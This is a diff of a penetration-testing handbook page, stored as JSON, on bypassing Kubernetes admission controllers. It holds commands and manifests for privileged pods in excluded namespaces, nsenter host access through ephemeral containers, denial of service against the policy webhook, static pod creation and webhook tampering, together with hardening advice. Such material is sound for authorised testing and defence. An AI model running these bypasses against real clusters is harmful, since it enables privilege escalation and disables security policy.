@@ -18,7 +18,7 @@
             "type": "code_block",
             "content": [
                 "# Admission flow:",
-                "# 1. API Request → Authentication → Authorization → Admission Controllers → etcd",
+                "# 1. API Request \u2192 Authentication \u2192 Authorization \u2192 Admission Controllers \u2192 etcd",
                 "",
                 "# Types:",
                 "# - Validating: Accept/reject requests",
@@ -32,66 +32,45 @@
             ]
         },
         {
-            "heading": "Enumeration",
+            "heading": "Enumeration & Discovery",
             "subheadings": [
                 {
-                    "heading": "Discover Admission Controllers",
+                    "heading": "Identifying Active Controllers",
                     "type": "code_block",
                     "content": [
-                        "# Check enabled admission controllers",
-                        "kubectl get --raw /apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | jq",
-                        "kubectl get --raw /apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations | jq",
-                        "",
-                        "# List all webhook configurations",
+                        "# Check enabled validating and mutating webhooks",
                         "kubectl get validatingwebhookconfigurations",
                         "kubectl get mutatingwebhookconfigurations",
                         "",
-                        "# Check specific webhook details",
-                        "kubectl describe validatingwebhookconfiguration gatekeeper-validating-webhook-configuration",
+                        "# Detailed webhook inspection",
+                        "kubectl get --raw /apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | jq",
                         "",
-                        "# OPA Gatekeeper constraints",
+                        "# Check OPA Gatekeeper constraints",
                         "kubectl get constraints",
-                        "kubectl get constrainttemplates",
-                        "",
-                        "# Kyverno policies",
-                        "kubectl get clusterpolicies",
-                        "kubectl get policies -A"
+                        "kubectl get constrainttemplates"
                     ]
                 },
                 {
-                    "heading": "Identify Policy Gaps",
+                    "heading": "Detecting Policy Gaps",
                     "type": "code_block",
                     "content": [
-                        "# Check what namespaces are excluded",
-                        "kubectl get validatingwebhookconfiguration gatekeeper-validating-webhook-configuration -o json | \\",
-                        "  jq '.webhooks[].namespaceSelector'",
+                        "# Identify excluded namespaces (often kube-system, gatekeeper-system)",
+                        "kubectl get validatingwebhookconfiguration <name> -o json | jq '.webhooks[].namespaceSelector'",
                         "",
-                        "# Common excluded namespaces:",
-                        "# - kube-system",
-                        "# - gatekeeper-system",
-                        "# - kyverno",
-                        "# - cert-manager",
-                        "",
-                        "# Check failurePolicy",
-                        "kubectl get validatingwebhookconfiguration -o json | \\",
-                        "  jq '.items[].webhooks[].failurePolicy'",
-                        "# Ignore = bypass when webhook fails",
-                        "# Fail = deny when webhook fails"
+                        "# Check failurePolicy (Ignore = bypass when webhook fails)",
+                        "kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].failurePolicy'"
                     ]
                 }
             ]
         },
         {
-            "heading": "Policy Bypass Techniques",
+            "heading": "Universal Policy Bypass Techniques",
             "subheadings": [
                 {
                     "heading": "Excluded Namespace Abuse",
                     "type": "code_block",
                     "content": [
-                        "# If kube-system is excluded from admission",
-                        "kubectl create deployment pwned --image=malicious:latest -n kube-system",
-                        "",
-                        "# Create pod in excluded namespace",
+                        "# If kube-system is excluded, create privileged pod there",
                         "cat <<EOF | kubectl apply -f -",
                         "apiVersion: v1",
                         "kind: Pod",
@@ -115,281 +94,34 @@
                     ]
                 },
                 {
-                    "heading": "Label-Based Bypass",
-                    "type": "code_block",
+                    "heading": "TOCTOU & Ephemeral Bypass",
+                    "type": "list",
                     "content": [
-                        "# If policy exempts certain labels",
-                        "# Find exemption labels",
-                        "kubectl get constrainttemplate k8srequiredlabels -o yaml",
-                        "",
-                        "# Add exemption label to pod",
-                        "apiVersion: v1",
-                        "kind: Pod",
-                        "metadata:",
-                        "  name: bypass-pod",
-                        "  labels:",
-                        "    policy-exemption: \"true\"  # Matches policy exception",
-                        "spec:",
-                        "  containers:",
-                        "  - name: test",
-                        "    image: alpine"
-                    ]
-                },
-                {
-                    "heading": "Time-of-Check vs Time-of-Use (TOCTOU)",
-                    "type": "code_block",
-                    "content": [
-                        "# Create valid resource, then modify after admission",
-                        "# Step 1: Create compliant deployment",
-                        "kubectl create deployment safe --image=nginx",
-                        "",
-                        "# Step 2: Directly patch the pod (bypasses deployment controller)",
-                        "kubectl patch pod safe-xxx --type='json' -p='[",
-                        "  {\"op\": \"add\", \"path\": \"/spec/containers/0/securityContext\", ",
-                        "   \"value\": {\"privileged\": true}}",
-                        "]'",
-                        "",
-                        "# This may work if:",
-                        "# - Pod updates aren't validated",
-                        "# - Admission only checks create, not update"
-                    ]
-                },
-                {
-                    "heading": "Ephemeral Container Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "# Ephemeral containers might not be validated",
-                        "kubectl debug -it pod-name --image=busybox --target=main-container",
-                        "",
-                        "# If that works, try privileged",
-                        "kubectl debug -it pod-name --image=busybox --target=main-container -- sh -c 'nsenter -t 1 -m -u -i -n sh'",
-                        "",
-                        "# Create ephemeral container with hostPID",
-                        "kubectl alpha debug node/node-name -it --image=busybox"
-                    ]
-                },
-                {
-                    "heading": "Webhook Timeout Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "# Force webhook timeout to trigger failurePolicy: Ignore",
-                        "# Create resource with payload that causes slow validation",
-                        "",
-                        "# Large payload",
-                        "kubectl create configmap large-config --from-literal=data=$(python3 -c 'print(\"A\"*1000000)')",
-                        "",
-                        "# Many annotations",
-                        "for i in {1..1000}; do",
-                        "  annotations+=\"annotation-$i: value-$i\\n\"",
-                        "done"
-                    ]
-                },
-                {
-                    "heading": "Webhook Availability Attack",
-                    "type": "code_block",
-                    "content": [
-                        "# If failurePolicy: Ignore, DoS the webhook",
-                        "",
-                        "# Find webhook service",
-                        "kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].clientConfig.service'",
-                        "",
-                        "# Scale down webhook pods (if you have access)",
-                        "kubectl scale deployment gatekeeper-controller-manager -n gatekeeper-system --replicas=0",
-                        "",
-                        "# Network policy blocking (if you control network policies)",
-                        "cat <<EOF | kubectl apply -f -",
-                        "apiVersion: networking.k8s.io/v1",
-                        "kind: NetworkPolicy",
-                        "metadata:",
-                        "  name: block-webhook",
-                        "  namespace: gatekeeper-system",
-                        "spec:",
-                        "  podSelector:",
-                        "    matchLabels:",
-                        "      app: gatekeeper",
-                        "  policyTypes:",
-                        "  - Ingress",
-                        "  ingress: []",
-                        "EOF",
-                        "",
-                        "# Now create resources - webhook can't validate",
-                        "kubectl run pwned --image=malicious:latest --privileged"
-                    ]
-                },
-                {
-                    "heading": "Static Pod Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "# Static pods bypass API server admission entirely",
-                        "# Requires node access",
-                        "",
-                        "# Write static pod manifest",
-                        "cat > /etc/kubernetes/manifests/pwned.yaml <<EOF",
-                        "apiVersion: v1",
-                        "kind: Pod",
-                        "metadata:",
-                        "  name: static-pwned",
-                        "spec:",
-                        "  hostNetwork: true",
-                        "  hostPID: true",
-                        "  containers:",
-                        "  - name: pwned",
-                        "    image: ubuntu",
-                        "    securityContext:",
-                        "      privileged: true",
-                        "    command: [\"sleep\", \"infinity\"]",
-                        "EOF",
-                        "",
-                        "# Kubelet creates pod without API server validation"
+                        "**TOCTOU**: Create a compliant deployment, then patch the pod directly if update validation is weak.",
+                        "**Ephemeral Containers**: Validation might miss ephemeral containers added via `kubectl debug`.",
+                        "**Static Pods**: Directly write manifests to `/etc/kubernetes/manifests/` on a node to bypass the API server entirely."
                     ]
                 }
             ]
         },
         {
-            "heading": "OPA Gatekeeper Specific Bypasses",
+            "heading": "Targeted Bypasses: OPA & Kyverno",
             "subheadings": [
                 {
-                    "heading": "Constraint Template Gaps",
-                    "type": "code_block",
+                    "heading": "OPA Gatekeeper Logic Gaps",
+                    "type": "list",
                     "content": [
-                        "# Check constraint template for gaps",
-                        "kubectl get constrainttemplate k8sallowedrepos -o yaml",
-                        "",
-                        "# Look for:",
-                        "# - Missing parameters",
-                        "# - Incomplete Rego rules",
-                        "# - Version-specific issues",
-                        "",
-                        "# Example: Policy only checks first container",
-                        "# Bypass by putting malicious container second",
-                        "spec:",
-                        "  containers:",
-                        "  - name: compliant",
-                        "    image: allowed-registry/nginx",
-                        "  - name: malicious",
-                        "    image: evil.com/backdoor  # Not checked!"
+                        "**Partial Container Check**: If policy only validates the first container, place malicious images in subsequent ones.",
+                        "**Rego Parsing Issues**: Bypass image tag restrictions (e.g., `latest`) by using digests or removing the colon entirely.",
+                        "**Sync Resource Desync**: Manipulate resources that OPA syncs for referential constraints to trick validation logic."
                     ]
                 },
                 {
-                    "heading": "Rego Logic Exploitation",
-                    "type": "code_block",
+                    "heading": "Kyverno Limitations",
+                    "type": "list",
                     "content": [
-                        "# Vulnerable policy example:",
-                        "package k8sdisallowedtags",
-                        "",
-                        "violation[{\"msg\": msg}] {",
-                        "  container := input.review.object.spec.containers[_]",
-                        "  tag := split(container.image, \":\")[1]",
-                        "  tag == \"latest\"",
-                        "  msg := \"Cannot use 'latest' tag\"",
-                        "}",
-                        "",
-                        "# Bypass: No tag (defaults to latest but not caught)",
-                        "# image: nginx  (no colon, split fails)",
-                        "",
-                        "# Bypass: sha256 digest",
-                        "# image: nginx@sha256:abc123..."
-                    ]
-                },
-                {
-                    "heading": "Sync Resource Manipulation",
-                    "type": "code_block",
-                    "content": [
-                        "# Gatekeeper syncs resources for referential constraints",
-                        "# Check what's synced",
-                        "kubectl get config.config.gatekeeper.sh -o yaml",
-                        "",
-                        "# If sync is incomplete, constraints fail open",
-                        "# Manipulate synced resources to pass validation",
-                        "",
-                        "# Example: Policy checks against ConfigMap whitelist",
-                        "# If ConfigMap is modified, pods using old data may be validated incorrectly"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "Kyverno Specific Bypasses",
-            "subheadings": [
-                {
-                    "heading": "Generate Rule Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "# If Kyverno generates resources",
-                        "# Manipulate generated resource before admission",
-                        "",
-                        "# Check generate policies",
-                        "kubectl get clusterpolicy -o yaml | grep -A 20 \"generate:\"",
-                        "",
-                        "# Generated resources have ownerReferences",
-                        "# Delete ownerReference to orphan resource, then modify"
-                    ]
-                },
-                {
-                    "heading": "Background Scan Limitations",
-                    "type": "code_block",
-                    "content": [
-                        "# Kyverno background scans are separate from admission",
-                        "# Resources created before policy are not checked by admission",
-                        "",
-                        "# If policy is new, old non-compliant resources exist",
-                        "kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "Pod Security Standards (PSS) Bypass",
-            "subheadings": [
-                {
-                    "heading": "Namespace Label Manipulation",
-                    "type": "code_block",
-                    "content": [
-                        "# PSS uses namespace labels for enforcement",
-                        "# pod-security.kubernetes.io/enforce: restricted",
-                        "",
-                        "# If you can modify namespace labels",
-                        "kubectl label namespace target-ns pod-security.kubernetes.io/enforce=privileged --overwrite",
-                        "",
-                        "# Now create privileged pods in that namespace"
-                    ]
-                },
-                {
-                    "heading": "RuntimeDefault Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "# seccompProfile: RuntimeDefault can vary by node",
-                        "# Different container runtimes have different defaults",
-                        "",
-                        "apiVersion: v1",
-                        "kind: Pod",
-                        "spec:",
-                        "  securityContext:",
-                        "    seccompProfile:",
-                        "      type: RuntimeDefault  # Passes PSS \"restricted\"",
-                        "  containers:",
-                        "  - name: test",
-                        "    image: alpine",
-                        "    # RuntimeDefault might still allow dangerous syscalls"
-                    ]
-                },
-                {
-                    "heading": "User Namespace Bypass (Kubernetes 1.25+)",
-                    "type": "code_block",
-                    "content": [
-                        "# User namespaces can provide isolation escape routes",
-                        "apiVersion: v1",
-                        "kind: Pod",
-                        "metadata:",
-                        "  name: userns-pod",
-                        "spec:",
-                        "  hostUsers: false  # Run in user namespace",
-                        "  containers:",
-                        "  - name: test",
-                        "    image: alpine",
-                        "    securityContext:",
-                        "      runAsNonRoot: true",
-                        "      # In user namespace, this maps to different host UID"
+                        "**Orphaned Resources**: Remove `ownerReferences` from Kyverno-generated resources to modify them without triggering regeneration.",
+                        "**Background Scan Lag**: Kyverno's background scans are distinct from admission; older resources may remain non-compliant."
                     ]
                 }
             ]
@@ -398,46 +130,29 @@
             "heading": "Admission Webhook Exploitation",
             "subheadings": [
                 {
-                    "heading": "Webhook Configuration Tampering",
-                    "type": "code_block",
+                    "heading": "Availability Attacks (DoS)",
+                    "type": "list",
                     "content": [
-                        "# If you have RBAC to modify webhook configs",
-                        "kubectl edit validatingwebhookconfiguration gatekeeper-validating-webhook-configuration",
-                        "",
-                        "# Disable webhook",
-                        "webhooks:",
-                        "- name: gatekeeper-webhook",
-                        "  failurePolicy: Ignore  # Change from Fail",
-                        "  ",
-                        "# Add exclusion",
-                        "  namespaceSelector:",
-                        "    matchExpressions:",
-                        "    - key: kubernetes.io/metadata.name",
-                        "      operator: NotIn",
-                        "      values: [\"my-namespace\"]  # Add your namespace"
+                        "If `failurePolicy: Ignore`, DoS the webhook pods to force a 'fail-open' state.",
+                        "Use `kubectl scale` to zero out the webhook deployment if you have necessary RBAC.",
+                        "Inject a `NetworkPolicy` to block the API server from reaching the webhook service."
                     ]
                 },
                 {
-                    "heading": "Certificate Issues",
+                    "heading": "Webhook Tampering",
                     "type": "code_block",
                     "content": [
-                        "# Webhook uses TLS, if cert issues exist",
-                        "# - Expired certificate",
-                        "# - Wrong CN/SAN",
-                        "# - Self-signed without caBundle",
+                        "# Modify configuration to add exclusion for your namespace",
+                        "kubectl edit validatingwebhookconfiguration <name>",
                         "",
-                        "# Check certificate",
-                        "kubectl get validatingwebhookconfiguration -o json | \\",
-                        "  jq '.items[].webhooks[].clientConfig.caBundle' | \\",
-                        "  base64 -d | openssl x509 -text -noout",
-                        "",
-                        "# If failurePolicy: Ignore, cert issues = no validation"
+                        "# Set failurePolicy to 'Ignore' to ensure bypass if webhook becomes unavailable",
+                        "failurePolicy: Ignore"
                     ]
                 }
             ]
         },
         {
-            "heading": "Detection & Prevention",
+            "heading": "Hardening & Detection",
             "subheadings": [
                 {
                     "heading": "Monitoring Commands",
@@ -446,98 +161,29 @@
                         "# Audit denied requests",
                         "kubectl get events --field-selector reason=FailedCreate -A",
                         "",
-                        "# Check Gatekeeper audit",
-                        "kubectl logs -n gatekeeper-system deployment/gatekeeper-audit -f",
-                        "",
-                        "# Kyverno policy reports",
-                        "kubectl get policyreport -A",
-                        "kubectl get clusterpolicyreport",
-                        "",
-                        "# API audit logs (if enabled)",
-                        "# Look for admission controller denials"
+                        "# Stream Gatekeeper audit logs",
+                        "kubectl logs -n gatekeeper-system deployment/gatekeeper-audit -f"
                     ]
                 },
                 {
-                    "heading": "Hardening Recommendations",
-                    "type": "code_block",
+                    "heading": "Security Recommendations",
+                    "type": "list",
                     "content": [
-                        "# Set failurePolicy to Fail",
-                        "webhooks:",
-                        "- failurePolicy: Fail",
-                        "",
-                        "# Minimize excluded namespaces",
-                        "namespaceSelector:",
-                        "  matchExpressions:",
-                        "  - key: admission.gatekeeper.sh/ignore",
-                        "    operator: DoesNotExist",
-                        "",
-                        "# Use Pod Security Admission with audit/warn modes",
-                        "kubectl label namespace my-ns \\",
-                        "  pod-security.kubernetes.io/enforce=restricted \\",
-                        "  pod-security.kubernetes.io/warn=restricted \\",
-                        "  pod-security.kubernetes.io/audit=restricted",
-                        "",
-                        "# Validate ephemeral containers",
-                        "# Validate update operations, not just create"
+                        "Always set `failurePolicy: Fail` for critical security webhooks.",
+                        "Ensure admission policies validate **UPDATE** operations in addition to **CREATE**.",
+                        "Monitor and restrict the use of excluded namespaces (kube-system, etc.).",
+                        "Implement CEL (Common Expression Language) for more robust, performant policy logic."
                     ]
                 }
             ]
         },
         {
-            "heading": "Checklist",
-            "type": "paragraph",
-            "content": "```markdown"
-        },
-        {
-            "heading": "Enumeration",
-            "type": "list",
-            "content": [
-                "[ ] List all admission webhooks",
-                "[ ] Identify excluded namespaces",
-                "[ ] Check failurePolicy settings",
-                "[ ] Review OPA/Kyverno policies"
-            ]
-        },
-        {
-            "heading": "Bypass Testing",
-            "type": "list",
-            "content": [
-                "[ ] Test excluded namespaces",
-                "[ ] Test label-based exemptions",
-                "[ ] Test ephemeral containers",
-                "[ ] Test webhook timeout",
-                "[ ] Test DoS against webhook"
-            ]
-        },
-        {
-            "heading": "Policy Gaps",
-            "type": "list",
-            "content": [
-                "[ ] Check for update vs create validation",
-                "[ ] Review Rego/CEL logic",
-                "[ ] Test edge cases (no tag, digests)",
-                "[ ] Check init container validation"
-            ]
-        },
-        {
-            "heading": "Static Pods",
-            "type": "list",
-            "content": [
-                "[ ] Check node access for static pod creation"
-            ]
-        },
-        {
-            "heading": "Post-Exploitation",
-            "type": "paragraph",
-            "content": "- [ ] Modify webhook configurations\n- [ ] Change namespace labels\n- [ ] Disable admission controllers\n```"
-        },
-        {
             "heading": "Related Topics",
             "type": "list",
             "content": [
-                "Docker/Kubernetes - Container security",
-                "RBAC - Kubernetes authorization",
-                "Container Escapes - Breakout techniques"
+                "[Docker/Kubernetes Security](/enumeration/cloud/docker-and-and-kubernetes)",
+                "[Kubernetes RBAC Exploitation](/enumeration/webservices/kubernetes-rbac)",
+                "[Container Escape Techniques](/enumeration/cloud/docker-and-and-kubernetes#container-escapes)"
             ]
         }
     ],
@@ -545,34 +191,18 @@
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-02-03T14:05:45.496Z",
+        "last_updated": "2026-04-23T00:40:00.000Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/cloud/k8s-admission-bypass.md",
         "previous_page": {
             "title": "Cloud AI Security",
             "url": "/enumeration/cloud/cloud-ai-security"
         },
         "next_page": {
-            "title": "Payloads",
-            "url": "/exploitation/payloads"
+            "title": "Cloud Security Summary",
+            "url": "/enumeration/cloud/summary"
         }
     }
 }
